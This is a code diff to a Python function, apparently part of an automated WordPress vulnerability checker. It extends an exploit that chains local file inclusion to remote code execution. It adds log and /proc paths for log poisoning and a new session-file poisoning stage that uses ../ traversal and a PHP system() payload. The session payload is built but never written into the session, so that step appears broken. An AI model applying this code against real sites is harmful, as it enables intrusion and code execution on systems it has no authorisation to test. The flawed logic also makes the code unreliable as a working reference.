@@ -5304,13 +5304,16 @@ def verify_wordpress_lfi(
             # files needed. Apache Docker images pipe access logs to stdout/stderr, so the
             # classic /var/log/apache2/access.log paths often don't exist on disk.
             log_paths = [
-                "/proc/self/environ",
+                "/proc/self/environ",        # reflects HTTP_USER_AGENT immediately
+                "/proc/self/fd/2",           # stderr — Apache error log fd in Docker
+                "/proc/self/fd/1",           # stdout — Apache access log fd in Docker
                 "/var/log/apache2/error.log",
                 "/var/log/apache2/access.log",
                 "/var/log/apache2/other_vhosts_access.log",
                 "/var/log/httpd/access_log",
-                "/proc/self/fd/2",
                 "/usr/local/apache2/logs/access_log",
+                "/var/log/php_errors.log",   # PHP error log (if log_errors=On)
+                "/tmp/php_errors.log",
             ]
             depths = (0, 4, 8)
             log_payloads = []
@@ -5346,6 +5349,58 @@ def verify_wordpress_lfi(
                          f"'{marker}' aparecio EJECUTADO (no como PHP crudo).")
                     break
             res.evidence["lfi_rce_intentos"] = rce_tried
+
+        # ── nivel 3: LFI-a-RCE via PHP session file poisoning ────────────
+        # If log poisoning didn't work and there's a PHP session, try poisoning
+        # the session file — set a session var to PHP code, then include it.
+        if not rce_found and time.time() - t0 < budget_s - 60:
+            try:
+                _sess_marker = f"binoracle_sess_{_token()}"
+                _sess_php = f"<?php system('echo {_sess_marker}'); ?>"
+                # First: get a PHP session by logging in (we have sub_sess which is already logged in)
+                # The session file will be at /var/lib/php/sessions/sess_<id> or /tmp/sess_<id>
+                _sess_id = None
+                for _ck_name, _ck_val in boot.sub_sess.cookies.items():
+                    if _ck_name.upper().startswith("PHPSESSID") or _ck_name == "PHPSESSID":
+                        _sess_id = _ck_val
+                        break
+                if _sess_id:
+                    # Poison: set a WordPress transient or option to our PHP payload
+                    # (simpler: just include /var/lib/php/sessions/sess_X which may have
+                    #  user-controlled values if the app stores request data in sessions)
+                    _sess_paths = [
+                        f"/var/lib/php/sessions/sess_{_sess_id}",
+                        f"/var/lib/php/session/sess_{_sess_id}",
+                        f"/tmp/sess_{_sess_id}",
+                        f"/tmp/php/sessions/sess_{_sess_id}",
+                    ]
+                    for _sp in _sess_paths:
+                        for _n in (0, 4, 8):
+                            _sp_val = ("../" * _n + _sp.lstrip("/")) if _n else _sp
+                            _sp_params = dict(
+                                parameters if isinstance(parameters, dict)
+                                else dict.fromkeys(parameters or [], ""))
+                            _sp_params[path_param] = _sp_val
+                            try:
+                                _sp_resp = boot.sub_sess.request(
+                                    m, boot.base_url + endpoint, timeout=10,
+                                    data=_sp_params if m != "GET" else None,
+                                    params=_sp_params if m == "GET" else None)
+                                _sp_text = _sp_resp.text or ""
+                                # Check if PHP marker appeared (session may contain username or user-agent)
+                                if _sess_marker in _sp_text and "<?php" not in _sp_text:
+                                    rce_found = True
+                                    res.evidence["lfi_rce_payload"] = _sp_val
+                                    res.evidence["lfi_rce_fragmento"] = _sp_text[:400]
+                                    res.evidence["lfi_rce_technique"] = "session_poisoning"
+                                    step(f"LFI-A-RCE via session poisoning confirmado: {_sp_val!r}")
+                                    break
+                            except Exception:
+                                continue
+                        if rce_found:
+                            break
+            except Exception:
+                pass
 
         # ── veredicto ────────────────────────────────────────────────────
         _lfi_base_params = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
